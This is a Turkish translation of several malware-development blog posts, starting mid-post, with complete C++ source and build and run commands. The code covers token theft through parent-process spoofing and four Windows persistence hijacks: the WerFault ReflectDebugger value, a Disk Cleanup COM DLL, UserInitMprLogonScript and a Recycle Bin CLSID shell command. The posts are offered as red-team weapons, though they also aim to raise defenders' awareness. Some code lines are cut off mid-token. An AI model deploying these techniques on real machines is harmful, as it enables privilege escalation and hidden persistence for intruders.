ZeroMemory(&si, sizeof(STARTUPINFOEXW));
ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
GetProcessHeap(),
0,
size
);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
Son olarak, süreci oluşturun:
res = CreateProcessW(app, NULL, NULL, NULL, true,
EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL,
(LPSTARTUPINFOW)&si, &pi);
printf(res ? "successfully create process :)\n" :
"failed to create process :(\n");
Bu mantığın tam kaynak kodu şu şekildedir:
/*
hack.cpp
token theft via
UpdateProcThreadAttribute
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/28/token-theft-2.html
*/
#include <windows.h>
#include <stdio.h>
#include <iostream>

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
HANDLE token;
TOKEN_PRIVILEGES tp;
LUID luid;
BOOL res = TRUE;

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
res = FALSE;
if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
printf(res ? "successfully enable %s :)\n" :
"failed to enable %s :(\n"
,
priv);
return res;
}

// create process
BOOL createProcess(DWORD pid, LPCWSTR app) {
STARTUPINFOEXW si;
PROCESS_INFORMATION pi;
SIZE_T size;
BOOL res = TRUE;
HANDLE ph = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);
printf(ph ? "successfully open process :)\n" :
"failed to open process :(\n");

ZeroMemory(&si, sizeof(STARTUPINFOEXW));
ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList =
(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

res = CreateProcessW(app, NULL, NULL, NULL, true,
EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL,
(LPSTARTUPINFOW)&si, &pi);
printf(res ? "successfully create process :)\n" :
"failed to create process :(\n");
return res;
}

int main(int argc, char** argv) {
if (!setPrivilege(SE_DEBUG_NAME)) return-1;
DWORD pid = atoi(argv[1]);
if (!createProcess(pid, L"C:\\Windows\\System32\\mspaint.exe")) return-1;
return 0;
}
Gördüğünüz gibi, kod önceki bölümden biraz farklıdır. Bu kod yalnızca kirli bir PoC olup, basitlik adına mspaint.exe’yi çalıştırıyorum.
Demo
Her şeyi çalışırken görelim. PoC’mizi derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++
{:class=“img-responsive”}
Ardından, bunu kurbanın makinesinde çalıştıralım:
.\hack.exe <PID>
+++++++++++++++++++++++++++++++++++++++++++++++
{:class=“img-responsive”}

Örneğin, winlogon.exe (PID: 544) erişim belirtecini çalabilirsiniz:
+++++++++++++++++++++++++++++++++++++++++++++++
{:class=“img-responsive”}

+++++++++++++++++++++++++++++++++++++++++++++++
{:class=“img-responsive”}

+++++++++++++++++++++++++++++++++++++++++++++++
{:class=“img-responsive”}

Gördüğünüz gibi, her şey mükemmel çalışıyor!
Bu gönderinin en azından siber güvenlik alanına yeni başlayanlar (ve muhtemelen profesyoneller) için biraz faydalı olmasını, ayrıca mavi takım üyelerine bu ilginç teknik hakkında farkındalık kazandırmasını ve kırmızı takım üyelerinin cephaneliğine bir silah eklemesini umuyorum.
Local Security Authority
Privilege Constants
LookupPrivilegeValue
AdjustTokenPrivileges
UpdateProcThreadAttribute
CreateProcessW
APT techniques: Token theft. Part 1
Github’taki kaynak kod



84. Kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 18. Windows Hata  
Raporlama. Basit C++ örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, kötü amaçlı yazılım kalıcılığıyla ilgili en ilginç tekniklerden biri olan WerFault.exe üzerinden yapılan bir araştırmaya dayanmaktadır.
WerFault.exe


Windows Hata Raporlama davranışını incelerken ilginç bir Kayıt Defteri yolu keşfettim:

HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs

Eğer WerFault.exe -pr <değer> komutunu çalıştırırsak, HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger=<path_value> okunur. Bu komut, WerFault.exe'yi "yansıtıcı hata ayıklayıcı" (reflective debugger) modunda çalıştırır ve bu oldukça ilginçtir.
Örneğin, WerFault.exe -pr 1 komutunu çalıştırıp Sysinternals Process Monitor ile kontrol edelim:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Başka bir filtre ekleyin:
+++++++++++++++++++++++++++++++++++++++++++++++

Sonuç olarak, bu değeri ele geçirmek için bir açık elde ediyoruz:
+++++++++++++++++++++++++++++++++++++++++++++++

Peki, hile nedir? Kayıt defteri değeri HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger'ı kendi kötü amaçlı uygulamamızla değiştirebiliriz, çünkü WerFault.exe bu değeri yalnızca okumakla kalmaz, aynı zamanda çalıştırır. Ve elbette bunu kalıcılık için kullanabiliriz.
pratik örnek

Basitlik açısından, her zamanki gibi, "kötü" uygulamam sadece bir meow-meow mesaj kutusudur (hack.cpp):
/*
meow-meow messagebox
author: @cocomelonc
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
lpCmdLine, int nCmdShow) {
MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
return 0;
}
Ardından, kötü amaçlı uygulamamla kayıt defteri anahtar değerini oluşturan bir betik oluşturun:
int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// malicious app
const char* exe = "Z:\\2022-11-02-malware-pers-18\\hack.exe";

// hijacked app
const char* wf = "WerFault.exe -pr 1";

// set evil app
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)
"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs", 0 ,
KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry key
RegSetValueEx(hkey, (LPCSTR)"ReflectDebugger", 0, REG_SZ, (unsigned char*)
exe, strlen(exe));
RegCloseKey(hkey);
}
}

Ayrıca, kalıcılık için klasik hilelerden birini kullandım:

// startup
res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry key
RegSetValueEx(hkey, (LPCSTR)"meow", 0, REG_SZ, (unsigned char*)wf,
strlen(wf));
RegCloseKey(hkey);
}
Sonuç olarak, nihai kaynak kodu şu şekilde görünmektedir (pers.cpp):
/*
pers.cpp
windows persistense via WerFault.exe
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// malicious app
const char* exe = "Z:\\2022-11-02-malware-pers-18\\hack.exe";

// hijacked app
const char* wf = "WerFault.exe -pr 1";

// set evil app
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)
"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs", 0 ,
KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry key
RegSetValueEx(hkey, (LPCSTR)"ReflectDebugger", 0, REG_SZ,
(unsigned char*)exe, strlen(exe));
RegCloseKey(hkey);
}

// startup
res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
// create new registry key
RegSetValueEx(hkey, (LPCSTR)"meow", 0, REG_SZ, (unsigned char*)wf,
strlen(wf));
RegCloseKey(hkey);
}
return 0;
}
demo
Haydi her şeyi çalışırken görelim. "Kötü" uygulamamızı derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

ve kalıcılık betiğini:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
+++++++++++++++++++++++++++++++++++++++++++++++


Her şeyi çalıştırmadan önce, ilk olarak kayıt defteri anahtarını ve değerini kontrol edin:
reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs\" /s
reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger" /s
"Kötü amaçlı yazılımı" doğruluğu kontrol etmek için çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++

Ayrıca, kalıcılık mantığı için kullanılan kayıt defteri anahtarlarını kontrol edin:
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /s
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, pers.exe'yi çalıştırın:
.\pers.exe
ve Windows Hata Raporlama kayıt defteri anahtarını tekrar kontrol edin:
reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /s
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, anahtar değeri düzenlendi ve doğruluğunu kontrol etmek için şu komutu çalıştırabilirsiniz:
WerFault.exe -pr 1
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, oturumu kapatın ve tekrar açın:
+++++++++++++++++++++++++++++++++++++++++++++++

ve birkaç saniye sonra beklenildiği gibi meow-meow mesaj kutumuz açılır:
+++++++++++++++++++++++++++++++++++++++++++++++

hack.exe'nin özelliklerini Process Hacker 2 ile kontrol edebilirsiniz:
+++++++++++++++++++++++++++++++++++++++++++++++

Ayrıca, Windows Hata Raporlama'yı ele geçirmek için yönetici ayrıcalıkları gerektiğine dikkat edin, ancak kalıcılık için düşük seviyeli ayrıcalıklar kullanıyoruz:
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error
Reporting\Hangs" -Name "ReflectDebugger"
Remove-ItemProperty -Path
"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "meow"

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++


Eğer her şeyi eski haline döndürmeye karar verirseniz bunu fark edebilirsiniz.
Gördüğünüz gibi her şey mükemmel çalışıyor! =..=
Bir sonraki 17. bölüm olmalıydı, ancak üçüncü bölümle birlikte çıkacak. 10 dakika boyunca neden çalışmadığını anlayamadım :)
+++++++++++++++++++++++++++++++++++++++++++++++
Bu taktiğin ve hilenin vahşi ortamda herhangi bir APT tarafından kullanılıp kullanılmadığını bilmiyorum, ancak bu gönderinin özellikle yazılım geliştirirken mavi takım üyelerinin farkındalığını artırmasını ve kırmızı takım üyelerinin cephaneliğine bir silah eklemesini umuyorum.
MSDN Windows Error Reporting
DLL hijacking
DLL hijacking with exported functions
Malware persistence: part 1
Github’taki kaynak kod


85. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 19. Disk Temizleme Aracı. Basit C++ Örneği.

﷽
+++++++++++++++++++++++++++++++++++++++++++++++


Bu gönderi, kötü amaçlı yazılımın kalıcılığıyla ilgili en ilginç tekniklerden biri olan Disk Temizleme Aracı üzerinden yapılan bir araştırmaya dayanmaktadır.
disk temizleme
Eğer sabit diskinizde sınırlı alanla ilgili bir sorun yaşadıysanız, kesinlikle Disk Temizleme aracını biliyorsunuzdur:
+++++++++++++++++++++++++++++++++++++++++++++++

Kırmızı takım üyeleri için iyi haber, kullanıcı arayüzünde görüntülenen "Silinecek dosyalar" listesi rastgele değildir. Sadece şu komutu çalıştırın:
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\VolumeCache
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, burada varsayılan kayıt defteri anahtar değerleri bile bulunuyor.
Ayrıca, eğer HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\default=<CL varsa, başka bir kayıt defteri anahtar değeri bulabiliriz: HKCR\CLSID\<CLSID>\InProcServer32 = <DLLPATH>:

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Demo amacıyla, burada HKEY_CLASSES_ROOT kayıt defterini örnek olarak gösteriyorum çünkü HKEY_CURRENT_USER boştur.
Bu, kalıcılık için COM DLL kaçırma tekniğini kullanabileceğimizi gösteriyor. Hadi deneyelim.
pratik örnek
Öncelikle, her zamanki gibi, “kötü amaçlı” bir DLL oluşturun (hack.cpp):
/*
hack.cpp
simple DLL
author: @cocomelonc
https://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason,
LPVOID lpReserved) {
switch (nReason) {
case DLL_PROCESS_ATTACH:
MessageBox(
NULL,
"Meow-meow!",
"=^..^=",
MB_OK
);
	break;
case DLL_PROCESS_DETACH:
	break;
case DLL_THREAD_ATTACH:
	break;
case DLL_THREAD_DETACH:
	break;
}
return TRUE;
}
Her zamanki gibi, basitlik adına, bu sadece bir meow-meow mesaj kutusudur.

Ardından kalıcılık betiğini (pers.cpp) oluşturun:
/*
pers.cpp
windows persistence via Disk Cleaner
author: @cocomelonc
https://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html
*/

#include <windows.h>
#include <string.h>
#include <cstdio>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// subkey
const char* sk =
"Software\\Classes\\CLSID\\{8369AB20-56C9-11D0-94E8-00AA0059CE02}
\\InprocServer32";

// malicious DLL
const char* dll = "Z:\\2022-11-16-malware-pers-19\\hack.dll";

// startup
LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL,
REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
if (res == ERROR_SUCCESS) {
// create new registry keys
RegSetValueEx(hkey, NULL, 0, REG_SZ, (unsigned char*)dll, strlen(dll));
RegCloseKey(hkey);
} else {
printf("cannot create subkey value :(\n");
return-1;
}
return 0;
}
CLSID olarak 8369AB20-56C9-11D0-94E8-00AA0059CE02 seçtim. Gördüğünüz gibi, kod COM kaçırma ile ilgili önceki gönderiyle benzerdir.
Tek fark değişken değerlerindedir.
demo
Öncelikle, kötü amaçlı DLL dosyamızı derleyelim:
x86_64-w64-mingw32-gcc -shared -o hack.dll hack.cpp
+++++++++++++++++++++++++++++++++++++++++++++++

Ve kalıcılık betiğimizi:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Dosyaları hedef makineye kopyalayın. Benim durumumda Windows 10 x64. Çalıştırın:
reg query "HKCU\Software\Classes\CLSID\{8369AB20-56C9-11D0-94E8-00AA0059CE02}" /s
.\pers.exe

+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel şekilde çalıştı!=..=
Fakat kalıcılık için kullanıcının Disk Temizleme Aracını çalıştırması gerekmektedir. Burada kalıcılık için klasik bir yöntemi kullanabilirim.
Başlangıçta Disk Temizleme’yi çalıştırmaya eklemek en iyi fikir olmayabilir çünkü bu aracın bir grafik arayüzü (GUI) vardır.
Bu programın komut satırı argümanlarını kullanmayı denedim:
cleanmgr.exe
cleanmgr.exe /cleanup
cleanmgr.exe /autoclean
cleanmgr.exe /setup
Ama başarısız oldu :(. Doğru şekilde çalıştı:
+++++++++++++++++++++++++++++++++++++++++++++++

Bu konuya ilerleyen gönderilerden birinde geri döneceğimi düşünüyorum.


Ayrıca, Microsoft belgelerine göre, şu konumlara yeni girişler ekleyebiliriz: HKLM\SOFTWARE\Microsoft\Windows\Current
Bu yöntemi herhangi bir APT'nin (Gelişmiş Kalıcı Tehdit) vahşi doğada kullanıp kullanmadığını bilmiyorum, ancak bu gönderinin özellikle yazılım geliştiren mavi takım üyelerine bu ilginç teknik hakkında farkındalık kazandırmasını ve kırmızı takım üyeleri için yeni bir silah eklemesini umuyorum.
MSDN Registering Disk Cleanup Handler
DLL hijacking
DLL hijacking with exported functions
Malware persistence: part 1
Malware persistence: part 3
Github’taki kaynak kod


86. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 20. UserInitMprLogonScript (Oturum Açma Komut Dosyası). Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, kötü amaçlı yazılımın kalıcılığıyla ilgili en ilginç tekniklerden biri olan UserInitMprLogonScript değeri üzerinden yapılan bir araştırmaya dayanmaktadır.
UserInitMprLogonScript
Windows, bir kullanıcı veya kullanıcı grubu sisteme giriş yaptığında oturum açma komut dosyalarının çalıştırılmasını sağlar.
Bir komut dosyasının yolunu HKCU\Environment\UserInitMprLogonScript kayıt defteri anahtarına eklemek bunu gerçekleştirir.
Bu nedenle, kalıcılık sağlamak için saldırganlar, giriş başlatıldığında otomatik olarak çalıştırılan Windows oturum açma komut dosyalarını kullanabilir.
pratik örnek
Hadi pratik bir örneğe bakalım. Öncelikle, her zamanki gibi, "kötü amaçlı" bir uygulama oluşturun.
Basitlik adına, her zamanki gibi, bu sadece bir meow-meow mesaj kutusu uygulamasıdır (hack.cpp):
/*
hack.cpp
evil app for windows persistence
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/12/09/malware-pers-20.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}
Ve ardından sadece kalıcılık betiğini oluşturun (pers.cpp):
/*
pers.cpp
windows persistence via
setting UserInitMprLogonScript value
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/12/09/malware-pers-20.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

// env
const char* env = "Environment";

// evil app
const char* exe = "Z:\\2022-12-09-malware-pers-20\\hack.exe";

// environment
LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)env, 0 , KEY_WRITE,
&hkey);
if (res == ERROR_SUCCESS) {
// update registry key value
// reg add "HKEY_CURRENT_USER\Environment" /v "UserInitMprLogonScript" /t
// REG_SZ /d "...\hack.exe" /f
RegSetValueEx(hkey, (LPCSTR)"UserInitMprLogonScript", 0, REG_SZ,
(unsigned char*)exe, strlen(exe));
RegCloseKey(hkey);
}
return 0;
}
Gördüğünüz gibi, mantık basittir.
Sadece HKCU\Environment altında UserInitMprLogonScript anahtar değerini kötü amaçlı yazılımımızın tam yolu olarak ayarlıyoruz - Z:\\2022-12-09-malware-pers-20\hack.exe.
demo
Hadi her şeyi çalışırken görelim. Öncelikle, Kayıt Defteri'ni kontrol edin:
reg query "HKCU\Environment" /s
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, saldırganın makinesinde (kali) kötü amaçlı yazılımımızı derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

 +++++++++++++++++++++++++++++++++++++++++++++++

Ve doğruluğunu kontrol etmek için, hack.exe dosyasını hedef makinede çalıştırmayı deneyelim (benim durumumda Windows 10 x64):
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, kötü amaçlı yazılımımız mükemmel şekilde çalışıyor.
Sonraki adımda, saldırganın makinesinde kalıcılık betiğimizi derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Ve saldırganın makinesinde çalıştıralım:
.\pers.exe
Ardından, Kayıt Defteri anahtar değerlerini tekrar kontrol edin:
reg query "HKCU\Environment" /s
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, anahtar (UserInitMprLogonScript) değeri ayarlanmış durumda.
Hepsi bu kadar. Şimdi çıkış yapıp tekrar giriş yapmayı deneyin:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Ve birkaç milisaniye sonra, kötü amaçlı yazılımımız, meow-meow açıldı:
+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, Process Hacker'ı açıp hack.exe özelliklerini kontrol edersek:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Ebeveyn işlemin "mevcut olmayan" bir işlem olduğunu görebiliriz.


Eğer Windows'un iç yapısını en azından biraz incelediyseniz, ebeveyni "mevcut olmayan" işlem olan süreçlerin olduğunu bilirsiniz.Örneğin, Windows Gezgini - explorer.exe. Ebeveyn işlemi userinit.exe veya winlogon.exe olabilir, ancak herhangi bir .exe dosyası da olabilir.
Ebeveyn işlem <Non-existent Process> olarak görünecektir çünkü userinit.exe kendini sonlandırır.Bir diğer örnek, Windows Oturum Açma - winlogon.exe.Ebeveyni "mevcut değil" olarak görünür çünkü smss.exe çıkış yapar.
hack.exe özelliklerini Sysinternals Process Explorer üzerinden kontrol edersek, "AutoStart Location" değerini görebiliriz:
+++++++++++++++++++++++++++++++++++++++++++++++

Her şey mükemmel şekilde çalıştı!=..=
Deneyin sonunda, anahtarı silin:
Remove-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript"
+++++++++++++++++++++++++++++++++++++++++++++++

Bu kalıcılık yöntemi, APT28 grubu ve Attor ile Zebrocy gibi yazılımlar tarafından vahşi ortamda kullanılmıştır.
Bu gönderinin özellikle mavi takım üyelerinin bu ilginç teknik hakkında farkındalık kazanmasına ve kırmızı takım üyeleri için yeni bir silah eklemesine yardımcı olacağını umuyorum.
Sysinternals Process Explorer
Malware persistence: part 1
APT28
Attor
Zebrocy (Trojan)
Github’taki kaynak kod


87. Kötü Amaçlı Yazılım Geliştirme: Kalıcılık - Bölüm 21. Geri Dönüşüm Kutusu, Belgelerim COM uzantı işleyicisi. Basit C++ Örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, kötü amaçlı yazılımların kalıcılığına yönelik daha ilginç tekniklerden biri olan Geri Dönüşüm Kutusu COM uzantı işleyicisini değiştirerek kalıcılık sağlama konusundaki kendi araştırmama dayanmaktadır.
CLSID listesi
İşletim sistemindeki belirli özel klasörler, benzersiz dizgilerle tanımlanır:
	• {20d04fe0-3aea-1069-a2d8-08002b30309d} - My Computer

• {450d8fba-ad25-11d0-98a8-0800361b1103} - My Documents

• {208d2c60-3aea-1069-a2d7-08002b30309d} - My Network Places

• {1f4de370-d627-11d1-ba4f-00a0c91eedba} - Network Computers

• {2227a280-3aea-1069-a2de-08002b30309d} - Printers and Faxes

• {645ff040-5081-101b-9f08-00aa002f954e} - Recycle Bin

CLSID'ye open\command alt anahtarını eklemek ve shell anahtarına yeni bir fiil eklemek, \command girişinde saklanan değeri çalıştıracaktır.
Pratik Örnek
Hadi pratik bir örneğe bakalım. Öncelikle, her zamanki gibi “kötü amaçlı” uygulamamızı oluşturalım.
Basitlik adına, yine meow-meow mesaj kutusu uygulaması yapıyoruz (hack.cpp):
/*
hack.cpp
evil app for windows persistence
author: @cocomelonc
https://cocomelonc.github.io/malware/2023/01/20/malware-pers-21.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}
Ardından, kalıcılık sağlayan betiği (pers.cpp) oluşturalım:
/*
pers.cpp
windows persistence via
recycle bin COM extension handler
author: @cocomelonc
https://cocomelonc.github.io/malware/2023/01/20/malware-pers-21.html
*/

#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
HKEY hkR = NULL;

// shell
const char* shell =
"SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell";

// evil app
const char* exe =
"C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe";

// key
LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)shell, 0 , KEY_WRITE, &hkey);
if (res == ERROR_SUCCESS) {
res = RegCreateKeyExA(hkey, "open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_A
if (res == ERROR_SUCCESS) {
// update registry key value
// reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002
// /ve /t REG_SZ /d "hack.exe" /f
// RegSetValueEx(hkey, (LPCSTR)"open\\command", 0, REG_SZ, (unsigned char*)exe, strlen
RegSetValueEx(hkR, NULL, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
RegCloseKey(hkR);
// RegCloseKey(hkey);
}
RegCloseKey(hkey);
}
return 0;
}
Gördüğünüz gibi, mantık oldukça basit.
Demo

Her şeyi çalışırken görelim. Öncelikle, Registry’yi kontrol edelim:
reg query
"HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell"
/s

+++++++++++++++++++++++++++++++++++++++++++++++

Daha sonra, saldırganın makinesinde (Kali) kötü amaçlı yazılımımızı derleyelim:

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Ve doğruluğunu kontrol etmek için hack.exe’yi kurbanın makinesinde (Windows 10 x64) çalıştıralım:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, kötü amaçlı yazılımımız mükemmel çalışıyor.
Bir sonraki adımda, saldırganın makinesinde kalıcılık betiğimizi derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Son olarak, bu kalıcılık betiğini kurbanın makinesinde çalıştırıp Registry’yi tekrar kontrol edelim:
.\pers.exe
reg query "HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell" /s

+++++++++++++++++++++++++++++++++++++++++++++++

Görüldüğü gibi, alt anahtar eklendi ve anahtar değeri ayarlandı.
Şimdi Geri Dönüşüm Kutusu’nu açmayı deneyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++

Eğer Process Explorer’ı açıp hack.exe’nin özelliklerine bakarsak:
+++++++++++++++++++++++++++++++++++++++++++++++

Ana işlemimizin explorer.exe (1680) olduğunu fark edebiliriz.
Mükemmel!=..=
Listedeki diğer CLSID'ler ne olacak?

Kalıcılık betiğinde küçük bir değişiklik yaptım:
/*
pers.cpp
windows persistence via
recycle bin COM extension handler
author: @cocomelonc
https://cocomelonc.github.io/malware/2023/01/20/malware-pers-21.html
*/
#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
HKEY hkR = NULL;

// shell
const char* shell =
